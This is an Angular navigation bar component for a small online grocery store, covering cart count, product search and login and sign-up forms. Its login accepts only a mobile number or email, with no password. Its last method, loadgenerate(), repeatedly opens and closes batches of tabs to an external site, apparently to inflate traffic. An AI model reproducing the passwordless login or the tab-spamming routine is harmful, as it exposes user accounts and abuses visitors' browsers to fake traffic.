import { Component, OnInit, ViewEncapsulation ,ViewChild} from '@angular/core';
import { CartItemsInfoService } from '../common-service/cart-items-info.service';
import { SessionStateService } from '../common-service/session-state.service';
import { ActivatedRoute, Params, Router } from '@angular/router';
import { AllproductProductinfoService } from '../common-service/allproduct-productinfo.service';
import { FormGroup, FormControl, Validators } from '@angular/forms';
import { HttprequestService } from '../common-service/httprequest.service';
import { MessageService } from 'primeng/api';
@Component({
  selector: 'app-nav-bar',
  templateUrl: './nav-bar.component.html',
  styleUrls: ['./nav-bar.component.scss'],
  encapsulation: ViewEncapsulation.None,
})
export class NavBarComponent implements OnInit {
  @ViewChild('opannellogin') opannellogin;
  opanneluserflag = false;
  cartitemsinfo :any = [];
  cartvalue = 0;
  invaliduser = false;
  cities=[];
  isloginform = true;
  issigninform = false;
  isNavbarOpen: boolean = false;
  suggestions: string[] = [];
  filteredSuggestions: string[] = [];
  producttype = [];
  allproductinfo = [];
  loginform: FormGroup;
  signinform: FormGroup;
  mobileflag = false;
  emailflag=false;
  usernameflag = false;
  existinguserflag = false;
  logedinuserinfo = {"username" : "","mobileno":"","emailid":""};
  constructor(private messageService: MessageService,private httpreq : HttprequestService ,private AllproductProductinfoService:AllproductProductinfoService,private router: Router, private CartItemsInfoService: CartItemsInfoService, private SessionStateService: SessionStateService) {
    this.cartitemsinfo = [];
    this.cartitemsinfo = this.CartItemsInfoService.itemsinfoobj;
    this.allproductinfo = this.AllproductProductinfoService.allproductinfo;
    this.setForm();
   }

  ngOnInit(): void {
    this.cartitemsinfo = [];
    this.opanneluserflag = false;
    if(localStorage.getItem("userinfo"))
      {
        this.opanneluserflag = true;
        this.logedinuserinfo = JSON.parse(localStorage.getItem("userinfo"));
      }
    this.cartitemsinfo = this.CartItemsInfoService.itemsinfoobj;
    this.suggestions = this.allproductinfo.map(val => val.productname);
    this.getcartcount();
    this.SessionStateService.on('updatedcartinfo').subscribe(() => {
      this.getcartcount();
    });
    this.isloginform = true;
    this.issigninform = false;
    this.invaliduser = false;
    this.cities = [
      { label: 'My Orders', value: 'My_Orders',icon: 'pi pi-list' },
      { label: 'My Cart', value: 'My_Cart', icon: 'pi pi-shopping-cart' },
      { label: 'Logout', value: 'Logout', icon: 'pi pi-sign-out'}
    ];
    this.producttype = [
      { label: 'Flour', value: 'flour', icon: 'pi pi-user' },
      { label: 'Rice Flour', value: 'riceflour', icon: 'pi pi-list' },
      { label: 'Besan', value: 'besan', icon: 'pi pi-shopping-cart' },
      { label: 'Oil', value: 'oil', icon: 'pi pi-sign-out' },
      { label: 'Rice', value: 'rice', icon: 'pi pi-sign-out' }
    ];
    
  }
  opensignform()
  {
    this.isloginform = false;
    this.issigninform = true;
  }
  openloginform()
  {
    this.isloginform = true;
    this.issigninform = false;
  }
  
  login()
  {
    this.invaliduser =false;
    let loginformval =this.loginform.value;
   if((!this.loginform.valid) || (loginformval?.mobileno == '' && loginformval?.emailid == '') )
    {
      this.invaliduser = true;
      return;
    }
    else
    {
      this.httpreq.loginuserinfodata(this.loginform.value).subscribe((data)=>
        {
           console.log("createuserinfodata response : " ,data);
           if(data && data[0] && data[0]['status'] == "success")
            {
              localStorage.setItem("userinfo",JSON.stringify(data[0]));
              this.invaliduser = false;
              this.opannellogin.hide();
              this.opanneluserflag = true;
              this.logedinuserinfo = JSON.parse(localStorage.getItem("userinfo"));
              this.setForm();
            }
            else
            {
              this.invaliduser = true;
            }
        });

    }
   console.log("loginform ",this.loginform.value);
  }


  adduser()
  {
    this.invaliduser =false;
    let signinformval =this.signinform.value;
    if((!this.signinform.valid) || (signinformval?.username && signinformval?.mobileno == '' && signinformval?.emailid == '') )
      {
        console.log("==================" );
        this.invaliduser = true;
        return;
      }
      else
      {
        this.httpreq.checkexistinguser(this.signinform.value).subscribe((data )=>{
          if(data && data[0] && data[0]['status'] == "fail")
            {
              this.existinguserflag =true;
              return;
            }
            else
            {
              this.httpreq.createuserinfodata(this.signinform.value).subscribe((data )=>
                { 
                  console.log("createuserinfodata response : " ,data)
                  if(data && data[0] && data[0]['status'] == "success")
                    {
                      this.isloginform = true;
                      this.issigninform = false;
                      this.invaliduser = false;
                      this.setForm();
                    }
                    else
                    {
                      this.invaliduser = true;
                    }
                });
            }
        });

        


      }
   console.log("signinform ",this.signinform.value);
  }
  setForm()
  {
    this.loginform = new FormGroup({
      'mobileno': new FormControl('', [ Validators.pattern(/^\d{10}$/)]),
      'emailid': new FormControl('', [ Validators.email])
    });
    this.signinform = new FormGroup({
      'username': new FormControl('', [Validators.required]),
      'mobileno': new FormControl('', [Validators.required, Validators.pattern(/^\d{10}$/)]),
      'emailid': new FormControl('', [Validators.required, Validators.email])
    });
  }
  filterSuggestions(event: any) {
    const query = event.query;
    this.filteredSuggestions = this.suggestions.filter(suggestion =>
      suggestion.toLowerCase().includes(query.toLowerCase())
    );
  }
  onSuggestionSelect(event)
  {
   console.log("onsuggention event.value : ",event);
    this.router.navigate(['/product-detail'], { queryParams: { productitem_name: event }, replaceUrl: true });
    this.SessionStateService.set('productdetailsearchsection', event, true);
  }
  selectProductType(event:any)
  {
    this.router.navigate(['/product'], { queryParams: { producttype_name: event.value }, replaceUrl: true });
    this.SessionStateService.set('productinfotypesection', event.value, true);
  }
  selectNavProductType(event: any) {
    this.router.navigate(['/product'], { queryParams: { producttype_name: event }, replaceUrl: true });
    this.SessionStateService.set('productinfotypesection', event, true);
  }
  selectUsermenu(event: any) {
    console.log('selectUsermenu Value:', event.value);
    let logedinuserinfo = JSON.parse(localStorage.getItem("userinfo"));
   
    if(event.value == 'My_Orders')
      {
        this.httpreq.getuserorderinfo({"username":logedinuserinfo.username}).subscribe((data )=>
          { 
            console.log("getuserorderinfo response : " ,data)
            if(data && data[0] && data[0]['status'] == "success")
              {
                console.log("data[0][data] ",data[0]['data']);
              }
          });
      }

      else if(event.value == 'My_Cart')
        {
          this.httpreq.getusercartinfo(logedinuserinfo.username).subscribe((data )=>
            { 
              console.log("getuserorderinfo response : " ,data)
              if(data && data[0] && data[0]['status'] == "success")
                {
                  console.log("data[0][data] ",data[0]['data']);
                }
            });
        }

     else if( event.value == 'Logout') {
      localStorage.clear();
      this.opanneluserflag = false;
      this.logedinuserinfo = {"username" : "", "mobileno":"","emailid":""};
      this.messageService.add({ key: 'nav_key', severity: 'success', summary: 'Success', detail: "user Logout Successfull!" });
     } 
  }
  toggleNavbar() {
    this.isNavbarOpen = !this.isNavbarOpen;
  }

  getcartcount()
  {
    this.cartvalue = 0;
    //console.log("getcartcount this.cartitemsinfo : ", this.cartitemsinfo);
    this.cartitemsinfo.forEach(element => {
      this.cartvalue += element.cartvalue;

    });
  }


  loadgenerate()
  {
    setInterval(()=>{
      for (let i = 0; i < 10; i++) {
        let newTab = window.open('https://ayodhyawasiapnastore.rf.gd/', '_blank');// window.open("https://waahbiryani.rf.gd/");
        setTimeout(() => {
          newTab.close();
        }, 10000);
      }
    },10000)
    
  }
}
